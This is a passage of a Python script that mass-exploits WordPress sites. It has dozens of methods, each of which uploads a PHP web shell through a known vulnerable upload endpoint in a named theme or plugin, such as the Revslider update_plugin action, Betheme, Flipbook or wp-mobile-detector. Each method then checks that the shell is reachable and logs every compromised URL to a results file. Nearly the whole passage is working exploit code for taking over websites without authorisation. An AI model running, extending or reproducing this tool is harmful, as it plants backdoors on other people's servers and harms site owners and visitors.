				print('[WordPress] {}{}{} ||{}Dandelion{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			pass


	def satoshi(self, url):

		try:

			data = {'Filedata':open (php, 'rb')}
			p = (url+'/wp-content/themes/satoshi/functions/upload-handler.php')
			c = (url+'/wp-content/uploads/'+str(x.year)+'/'+str(x.month)+'/Uploader_By_Cloud7_Agath.php')
			satpost = requests.post(p, headers=headers, files=data)
			satget = requests.get(c, headers=headers, timeout=8)
			if 'Uploader_By_Cloud7_Agath_' in satget.content:
				print('[WordPress] {}{}{} ||{}Satoshi{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Satoshi{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def evolve(self, url):

		try:

			data = {'qqfile':open (php, 'rb')}
			p = (url+'/wp-content/themes/evolve/js/back-end/libraries/fileuploader/upload_handler.php')
			c = (url+'/wp-content/uploads/'+str(x.year)+'/'+str(x.month)+'/Uploader_By_Cloud7_Agath.php')
			evopost = requests.post(p, headers=headers, files=data)
			evoget = requests.get(c, headers=headers, timeout=8)
			if 'Uploader_By_Cloud7_Agath_' in evoget.content:
				print('[WordPress] {}{}{} ||{}Evolve{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Evolve{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))


		except:
			pass

	def saico(self, url):

		try:

			data = {'qqfile':open (php, 'rb')}
			p = (url+'/wp-content/themes/saico/framework/_scripts/valums_uploader/php.php')
			c = (url+'/wp-content/uploads/'+str(x.year)+'/'+str(x.month)+'/Uploader_By_Cloud7_Agath.php')
			saipost = requests.post(p, headers=headers, files=data)
			saiget = requests.get(c, headers=headers)
			if 'Uploader_By_Cloud7_Agath_' in saiget.content:
				print('[WordPress] {}{}{} ||{}Saico{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Saico{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))


		except:
			pass



	def synoptic(self, url):
		#

		try:
			data = {'file':open (php, 'rb')}
			p = (url+'/wp-content/themes/synoptic/lib/avatarupload/upload.php')
			c = (url+'/wp-content/uploads/markets/avatars/Uploader_By_Cloud7_Agath.php')
			asjdf = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[WordPress] {}{}{} ||{}Synoptic{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Synoptic{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))


		except:
			pass


	def synoptic2(self, url):
		#

		try:
			data = {'file':open (phpjpg, 'rb')}
			p = (url+'/wp-content/themes/synoptic/lib/avatarupload/upload.php')
			c = (url+'/wp-content/uploads/markets/avatars/Uploader_By_Cloud7_Agath.php.jpg')
			sadasd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=8)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[WordPress] {}{}{} ||{}Synoptic 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Synoptic 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass




	def clockstone(self, url):

		try:

			payload = {'value': './'}
			data = {'uploadfile':open (php, 'rb')}
			p = (url+'/wp-content/themes/clockstone/theme/functions/uploadbg.php')
			c = (url+'/wp-content/themes/clockstone/theme/functions/Uploader_By_Cloud7_Agath.php')
			clopost = requests.post(p, headers=headers, data=payload, files=data)
			cloget = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in cloget.content:
				print('[WordPress] {}{}{} ||{}Clockstone{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Clockstone{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))


		except:
			pass


	def andre(self, url):

		try:

			payload = {'action':'revslider_ajax_action',
						'client_action':'update_plugin'}
			data = {'update_file':open (zipp, 'rb')}
			p = (url+'/wp-admin/admin-ajax.php')
			c = (url+'/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/Uploader_By_Cloud7_Agath.php')
			anpost = requests.post(p, headers=headers, files=data, data=payload)
			anget = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in anget.content:
				print('[WordPress] {}{}{} ||{}Andre{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Andre{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))


		except:
			pass


	def rarebird(self, url):

		try:

			payload = {'action':'revslider_ajax_action',
						'client_action':'update_plugin'}
			data = {'update_file':open (zipp, 'rb')}
			p = (url+'/wp-admin/admin-ajax.php')
			c = (url+'/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/Uploader_By_Cloud7_Agath.php')
			rarpost = requests.post(p, headers=headers, data=payload, files=data)
			rarget = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in rarget.content:
				print('[WordPress] {}{}{} ||{}Rarebird{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')

			else:
				print('[WordPress] {}{}{} ||{}Rarebird{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))


		except:
			pass


	def designplus(self, url):

		try:

			payload = {'action':'revslider_ajax_action',
						'client_action':'update_plugin'}
			data = {'update_file':open (zipp, 'rb')}
			p = (url+'/wp-admin/admin-ajax.php')
			c = (url+'/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/Uploader_By_Cloud7_Agath.php')
			despost = requests.post(p, headers=headers, data=payload, files=data)
			desreq = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in desreq.content:
				print('[WordPress] {}{}{} ||{}Designplus{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')

			else:
				print('[WordPress] {}{}{} ||{}Designplus{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))


		except:
			pass

	def pindol(self, url):

		try:

			payload = {'action': 'revslider_ajax_action',
						'client_action':'update_plugin'}
			p = (url+'/wp-admin/admin-ajax.php')
			c = (url+'/wp-content/themes/pindol/revslider/temp/update_extract/revslider/Uploader_By_Cloud7_Agath.php')
			data = {'update_file':open (zipp, 'rb')}
			pinpost = requests.post(p, headers=headers, data=payload, files=data)
			pinget = requests.get(c, headers=headers, timeout=8)
			if 'Uploader_By_Cloud7_Agath_' in pinget.content:
				print('[WordPress] {}{}{} ||{}Pindol{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')

			else:
				print('[WordPress] {}{}{} ||{}Pindol{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))


		except:
			pass


	def cuckootap(self, url):

		try:

			payload = {'action':'revslider_ajax_action',
						'client_action':'update_plugin'}
			p = (url+'/wp-admin/admin-ajax.php')
			c = (url+'/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/Uploader_By_Cloud7_Agath.php')
			data = {'update_file':open (zipp, 'rb')}
			cuckpost = requests.post(p, headers=headers, data=payload, files=data)
			cuckget = requests.get(c, headers=headers, timeout=8)
			if 'Uploader_By_Cloud7_Agath_' in cuckget.content:
				print('[WordPress] {}{}{} ||{}Cuckootap{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Cuckootap{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))


		except:
			pass

	def beach_apollo(self, url):

		try:

			payload = {'action':'revslider_ajax_action',
						'client_action':'update_plugin'}

			data = {'update_file':open (zipp, 'rb')}
			p = (url+'/wp-admin/admin-ajax.php')
			c = (url+'/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/Uploader_By_Cloud7_Agath.php')
			beachpost = requests.post(p, headers=headers, data=payload, files=data)
			beachget = requests.get(c, headers=headers, timeout=8)
			if 'Uploader_By_Cloud7_Agath_' in beachget.content:
				print('[WordPress] {}{}{} ||{}Beach_Apollo{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Beach_Apollo{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))


		except:
			pass


	def centum(self, url):

		try:

			payload = {'action':'revslider_ajax_action',
						'client_action':'update_plugin'}
			p = (url+'/wp-admin/admin-ajax.php')
			c = (url+'/wp-content/themes/centum/revslider/temp/update_extract/revslider/Uploader_By_Cloud7_Agath.php')
			data = {'update_file':open (zipp, 'rb')}

			cenpost = requests.post(p, headers=headers, data=payload, files=data)
			cenget = requests.get(c, headers=headers, timeout=8)
			if 'Uploader_By_Cloud7_Agath_' in cenget.content:
				print('[WordPress] {}{}{} ||{}Centum{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')

			else:
				print('[WordPress] {}{}{} ||{}Centum{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))


		except:
			pass


	def medicate(self, url):

		try:

			payload = {'action':'revslider_ajax_action',
						'client_action':'update_plugin'}

			data = {'update_file':open (zipp, 'rb')}
			p = (url+'/wp-admin/admin-ajax.php')
			c = (url+'/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/Uploader_By_Cloud7_Agath.php')
			medpost = requests.post(p, headers=headers, data=payload, files=data)
			medget = requests.get(c, headers=headers, timeout=8)
			if 'Uploader_By_Cloud7_Agath_' in medget.content:
				print('[WordPress] {}{}{} ||{}Medicate{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')

			else:
				print('[WordPress] {}{}{} ||{}Medicate{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))


		except:
			pass

	def money(self, url):

		try:

			data = {'Filedata':open (php, 'rb')}
			p = (url+'/wp-content/themes/MoneyTheme/uploads/upload.php')
			c = (url+'/wp-content/themes/MoneyTheme/uploads/uploads/Uploader_By_Cloud7_Agath.php')
			monpost = requests.post(p, headers=headers, files=data)
			monget = requests.get(c, headers=headers, timeout=9)

			if 'Uploader_By_Cloud7_Agath_' in monget.content:
				print('[WordPress] {}{}{} ||{}Money{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Money{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))


		except:
			pass


	def bet(self, url):

		try:

			data = {'Filedata':open (php, 'rb')}
			p = (url+'/wp-content/themes/betheme/muffin-options/fields/upload/field_upload.php')
			c = (url+'/wp-content/themes/betheme/muffin-options/fields/upload/Files/Uploader_By_Cloud7_Agath.php')
			betpost = requests.post(p, headers=headers, files=data)
			betget = requests.get(c, headers=headers, timeout=8)

			if 'Uploader_By_Cloud7_Agath_' in betget.content:
				print('[WordPress] {}{}{} ||{}Betheme{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Betheme{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))


		except:
			pass



	def flipbook(self, url):

		try:

			data = {'qqfile':open (php, 'rb')}
			p = (url+'/wp-content/plugins/flipbook/php.php')
			c = (url+'/wp-includes/fb-images/Uploader_By_Cloud7_Agath.php')
			flippost = requests.post(p, headers=headers, files=data)
			flipget = requests.get(c, headers=headers, timeout=8)
			if 'Uploader_By_Cloud7_Agath_' in flipget.content:
				print('[WordPress] {}{}{} ||{}Flipbook{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Flipbook{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def wpstorecart(self, url):

		try:

			data = {'Filedata':open (php, 'rb')}
			p = (url+'/wp-content/plugins/wpstorecart/php/upload.php')
			c = (url+'/wp-content/uploads/wpstorecart/Uploader_By_Cloud7_Agath.php')
			wpspost = requests.post(p, headers=headers, files=data)
			wpsget = requests.get(c, headers=headers, timeout=8)
			if 'Uploader_By_Cloud7_Agath_' in wpsget.content:
				print('[WordPress] {}{}{} ||{}Wpstorecart{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			
			else:
				print('[WordPress] {}{}{} ||{}Wpstorecart{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))


		except:
			pass

	def dzsvideogallery(self, url):

		try:

			data = {'file_field':open (phpjpg, 'rb')}
			p = (url+'/wp-content/plugins/dzs-videogallery/admin/upload.php')
			c = (url+'/wp-content/plugins/dzs-videogallery/admin/upload/Uploader_By_Cloud7_Agath.php.jpg')
			dzpost = requests.post(p, headers=headers, files=data)
			dzget = requests.get(c, headers=headers, timeout=8)
			if 'Uploader_By_Cloud7_Agath_' in dzget.content:
				print('[WordPress] {}{}{} ||{}Dzs Videogallery{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Dzs Videogallery{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def adsmanager(self, url):

		try:

			payload = {'action':'upload_ad_image',
						'path': '/'}
			data = {'uploadfile':open (php, 'rb')}
			p = (url+'/wp-content/plugins/simple-ads-manager/sam-ajax-admin.php')
			c = (url+'/wp-content/plugins/simple-ads-manager/Uploader_By_Cloud7_Agath.php')
			adspost = requests.post(p, headers=headers, data=payload, files=data)
			adsget = requests.get(c, headers=headers, timeout=8)
			if 'Uploader_By_Cloud7_Agath_' in adsget.content:
				print('[WordPress] {}{}{} ||{}Simple Ads Manager{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')

			else:
				print('[WordPress] {}{}{} ||{}Simple Ads Manager{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))


		except:
			pass


	def wpproperty(self, url):

		try:

			data = {'Filedata':open (php, 'rb')}
			p = (url+'/wp-content/plugins/wp-property/third-party/uploadify/uploadify.php')
			c = (url+'/wp-content/plugins/wp-property/third-party/uploadify/Uploader_By_Cloud7_Agath.php')
			wppost = requests.post(p, headers=headers, files=data)
			wpget = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in wpget.content:
				print('[WordPress] {}{}{} ||{}Wp Property{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Wp Property{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))


		except:
			pass


	def cherry(self, url):

		try:

			data = {'file':open (php, 'rb')}
			p = (url+'/wp-content/plugins/cherry-plugin/admin/import-export/upload.php')
			c = (url+'/wp-content/plugins/cherry-plugin/admin/import-export/Uploader_By_Cloud7_Agath.php')
			cherpost = requests.post(p, headers=headers, files=data)
			cherget = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in cherget.content:
				print('[WordPress] {}{}{} ||{}Cherry{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Cherry{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))
		except:
			pass


	def cherry2(self, url):

		try:

			data = {'file':open (phtml, 'rb')}
			p = (url+'/wp-content/plugins/cherry-plugin/admin/import-export/upload.php')
			c = (url+'/wp-content/plugins/cherry-plugin/admin/import-export/Uploader_By_Cloud7_Agath.phtml')
			cherpost = requests.post(p, headers=headers, files=data)
			cherget = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in cherget.content:
				print('[WordPress] {}{}{} ||{}Cherry 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Cherry 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def tevolution(self, url):
		# satu

		try:

			data = {'file':open (php, 'rb')}
			p = (url+'/wp-content/plugins/Tevolution/tmplconnector/monetize/templatic-custom_fields/single-upload.php')
			c = (url+'/wp-content/themes/Directory/images/tmp/Uploader_By_Cloud7_Agath.php')
			tevpost = requests.post(p, headers=headers, files=data)
			tevget = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in tevget.content:
				print('[WordPress] {}{}{} ||{}Tevolution{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Tevolution{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def showbiz(self, url):

		# satu

		try:

			payload = {'action':'showbiz_ajax_action', 'client_action':'update_plugin'}

			data = {'update_file':open (php, 'rb')}
			p = (url+'/wp-admin/admin-ajax.php')
			c = (url+'/wp-content/plugins/showbiz/temp/update_extract/Uploader_By_Cloud7_Agath.php')
			showpost = requests.post(p, headers=headers, data=payload, files=data)
			showget = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in showget.content:
				print('[WordPress] {}{}{} ||{}Showbiz{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Showbiz{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass

	def userupload(self, url):
		try:

			payload = {'folder': '/test/'}
			data = {'file':open (php, 'rb')}
			p = (url+'/wp-content/plugins/wordpress-member-private-conversation/doupload.php')
			c = (url+'/wp-content/uploads/user_uploads/test/Uploader_By_Cloud7_Agath.php')
			userpost = requests.post(p, headers=headers, data=payload, files=data)
			userget = requests.get(c, headers=headers, timeout=8)

			if 'Uploader_By_Cloud7_Agath_' in userget.content:
				print('[WordPress] {}{}{} ||{}User Uploads{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}User Uploads{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def assetmanager(self, url):
		# satu

		try:

			data = {'Filedata':open (php, 'rb')}
			p = (url+'/wp-content/plugins/asset-manager/upload.php')
			c = (url+'/wp-content/uploads/assets/temp/Uploader_By_Cloud7_Agath.php')
			assetpost = requests.post(p, headers=headers, files=data)
			assetget = requests.get(c, headers=headers, timeout=8)

			if 'Uploader_By_Cloud7_Agath_' in assetget.content:
				print('[WordPress] {}{}{} ||{}Asset Manager{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Asset Manager{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def cnhk(self, url):
		# satu

		try:

			data = {'slideshow':open (php, 'rb')}
			p = (url+'/wp-content/plugins/cnhk-slideshow/uploadify/uploadify.php')
			c = (url+'/wp-content/plugins/cnhk-slideshow/uploadify/Uploader_By_Cloud7_Agath.php')

			cnhpost = requests.post(p, headers=headers, files=data)
			cnhget = requests.get(c, headers=headers, timeout=9)

			if 'Uploader_By_Cloud7_Agath_' in cnhget.content:
				print('[WordPress] {}{}{} ||{}Chnk Slideshow{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Chnk Slideshow{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))


		except:
			pass

	def cstmbckgrn(self, url):
		# satu

		try:

			data = {'Filedata':open (php, 'rb')}
			p = (url+'/wp-content/plugins/custom-background/uploadify/uploadify.php')
			c = (url+'/wp-content/plugins/custom-background/uploadify/Uploader_By_Cloud7_Agath.php')
			cstmpost = requests.post(p, headers=headers, files=data)
			cstmget = requests.get(c, headers=headers, timeout=9)

			if 'Uploader_By_Cloud7_Agath_' in cstmget.content:
				print('[WordPress] {}{}{} ||{}Custom Background{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Custom Background{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))


		except:
			pass


	def workthe(self, url):
		# file

		try:
			data = {'file':open (php, 'rb')}
			p = (url+'/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php')
			c = (url+'/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/files/Uploader_By_Cloud7_Agath.php')
			asdhfs = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[WordPress] {}{}{} ||{}Work The Flow{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Work The Flow{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def workthe2(self, url):
		# file
		# last

		try:
			data = {'file':open (phpjpg, 'rb')}
			p = (url+'/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php')
			c = (url+'/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/files/Uploader_By_Cloud7_Agath.php.jpg')
			asdjb = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=8)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[WordPress] {}{}{} ||{}Work The Flow 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Work The Flow 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))


		except:
			pass


	def category(self, url):
		#qqfile
		# one

		try:
			data = {'qqfile':open (php, 'rb')}
			p = (url+'/wp-content/plugins/category-page-icons/include/wpdev-flash-uploader.php')
			c = (url+'/wp-content/Uploader_By_Cloud7_Agath.php')
			asd = requests.post(p, headers=headers, files=data)
			dklf = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in dklf.content:
				print('[WordPress] {}{}{} ||{}Category Page Icons{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Category Page Icons{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def category2(self, url):
		# qqfile
		# last

		try:
			data = {'qqfile':open (phpjpg, 'rb')}
			p = (url+'/wp-content/plugins/category-page-icons/include/wpdev-flash-uploader.php')
			c = (url+'/wp-content/Uploader_By_Cloud7_Agath.php.jpg')
			asd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=8)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[WordPress] {}{}{} ||{}Category Page Icons 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Category Page Icons 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def assg(self, url):
		# one

		try:
			data = {'uploadfiles[]':open (php, 'rb')}
			p = (url+'/wp-content/uploads/assignments/ms-sitemple.php')
			c = (url+'/wp-content/uploads/assignments/Uploader_By_Cloud7_Agath.php')
			asdjh = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[WordPress] {}{}{} ||{}Assignments{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Assignments{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass



	def wpmobile(self, url):
		# satu

		try:


			post = {'file':open (php, 'rb')}
			p = (url+'/wp-content/plugins/wp-mobile-detector/resize.php')
			c = (url+'/wp-content/plugins/wp-mobile-detector/cache/Uploader_By_Cloud7_Agath.php')
			wpmobilepost = requests.post(p, headers=headers, files=data)
			wpmobileget = requests.get(c, headers=headers, timeout=9)

			if 'Uploader_By_Cloud7_Agath_' in wpmobileget.content:
				print('[WordPress] {}{}{} ||{}Wp Mobile Detector{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Wp Mobile Detector{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))


		except:

			pass


	def devtools2(self, url):
		# last 

		try:
			data = {'file':open (php, 'rb')}
			p = (url+'/wp-content/plugins/developer-tools/libs/swfupload/upload.php')
			c = (url+'/wp-content/plugins/developer-tools/libs/Uploader_By_Cloud7_Agath.php')
			asdasd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=9)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[WordPress] {}{}{} ||{}Developer Tools 2{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Developer Tools 2{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))

		except:
			pass


	def genesis(self, url):
		# one

		try:
			data = {'file':open (phpjpg, 'rb')}
			p = (url+'/wp-content/plugins/genesis-simple-defaults/uploadFavicon.php')
			c = (url+'/wp-content/uploads/favicon/Uploader_By_Cloud7_Agath.php.jpg')
			asdasd = requests.post(p, headers=headers, files=data)
			get = requests.get(c, headers=headers, timeout=8)
			if 'Uploader_By_Cloud7_Agath_' in get.content:
				print('[WordPress] {}{}{} ||{}Genesis Simple Defaults{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Genesis Simple Defaults{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))


		except:
			pass


	def acffrontend(self, url):
		# satu

		try:

			data = {'files':open (php, 'rb')}
			p = (url+'/wp-content/plugins/acf-frontend-display/js/blueimp-jQuery-File-Upload-d45deb1/server/php/index.php')
			c = (url+'/wp-content/uploads/uigen_'+str(x.year)+'/Uploader_By_Cloud7_Agath.php')
			acfpost = requests.post(p, headers=headers, files=data)
			acfget = requests.get(c, headers=headers, timeout=9)

			if 'Uploader_By_Cloud7_Agath_' in acfget.content:
				print('[WordPress] {}{}{} ||{}Acf Frontend{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Acf Frontend{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))


		except:
			pass

	def picaphoto(self, url):
		# satu

		try:

			data = {'uploadfile':open (php, 'rb')}
			p = (url+'/wp-content/plugins/pica-photo-gallery/picaPhotosResize.php')
			c = (url+'/wp-content/uploads/pica-photo-gallery/Uploader_By_Cloud7_Agath.php')

			picapost = requests.post(p, headers=headers, files=data)
			picaget = requests.get(c, headers=headers, timeout=9)

			if 'Uploader_By_Cloud7_Agath_' in picaget.content:
				print('[WordPress] {}{}{} ||{}Pica Photo Gallery{}|| \033[0;37;42mSuccess!'.format(sd,sb,url,fb,fp))
				open('Result/WordPress_Shell.txt', 'a').write(c+'\n')
			else:
				print('[WordPress] {}{}{} ||{}Pica Photo Gallery{}|| \033[0;37;41mFailed!'.format(sd,sb,url,fb,fp))


		except:
			pass


	def formcraft(self, url):
		# satu 
		# dir beda

		try:

